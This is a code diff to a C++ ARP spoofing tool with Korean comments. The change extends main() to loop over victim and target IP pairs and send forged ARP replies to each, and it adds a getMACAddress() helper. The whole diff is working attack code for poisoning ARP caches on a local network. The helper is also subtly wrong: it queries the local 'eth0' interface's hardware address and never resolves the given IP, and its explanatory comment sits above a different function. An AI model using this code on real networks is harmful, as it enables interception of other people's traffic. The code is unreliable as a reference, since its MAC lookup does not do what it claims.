@@ -18,6 +18,7 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
+// IP 주소를 MAC 주소로 변환하여 반환하는 함수
 std::string get_attacker_mac(const char *interface) {
     struct ifreq ifr;
     unsigned char *macAddress;
@@ -44,6 +45,45 @@ std::string get_attacker_mac(const char *interface) {
     
     close(sock);
     return macStr;
+}
+
+std::string getMACAddress(const char *ip) {
+    struct sockaddr_in *addr;
+    struct ifreq ifr;
+
+    // 소켓 생성
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        exit(1);
+    }
+
+    // 인터페이스 설정
+    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ); // 인터페이스 이름 설정
+    addr = (struct sockaddr_in *)&ifr.ifr_addr;
+    addr->sin_family = AF_INET;
+    inet_aton(ip, &addr->sin_addr);
+
+    // MAC 주소 가져오기
+    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
+        perror("ioctl");
+        close(sock);
+        exit(1);
+    }
+
+    close(sock);
+
+    // MAC 주소를 문자열로 변환
+    char macAddrStr[18];
+    sprintf(macAddrStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
+            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
+
+    return std::string(macAddrStr);
 }
 
 std::string arp_request(char* victim_ip, char* attacker_ip, std::string attacker_mac, pcap_t* handle) {
@@ -128,14 +168,19 @@ int main(int argc, char* argv[]) {
     }
     
     const char *interface = argv[1];
-    std::string attacker_mac = get_attacker_mac(interface);
+    std::string dummy_mac = "00:00:00:00:00:00";
     
-    printf("Attacker MAC = %s\n", attacker_mac.c_str());
-    
-    std::string victim_mac = arp_request(argv[2], argv[3], attacker_mac, handle);
-    printf("Victim MAC = %s\n", victim_mac.c_str());
-    
-    arp_reply(argv[2], argv[3], victim_mac, attacker_mac, handle);
+    for (int i=2; i<argc; i+=2) {
+        //std::string attacker_mac = get_attacker_mac(argv[1]);
+        //std::string attacker_mac = arp_request(argv[i], argv[i+1], dummy_mac, handle);
+        std::string attacker_mac = getMACAddress(argv[i+1]);
+        printf("Attacker MAC = %s\n", attacker_mac.c_str());
+        
+        std::string victim_mac = arp_request(argv[i], argv[i+1], attacker_mac, handle);
+        printf("Victim MAC = %s\n", victim_mac.c_str());
+        
+        arp_reply(argv[i], argv[i+1], victim_mac, attacker_mac, handle);
+    }
     
     pcap_close(handle);
     printf("done");
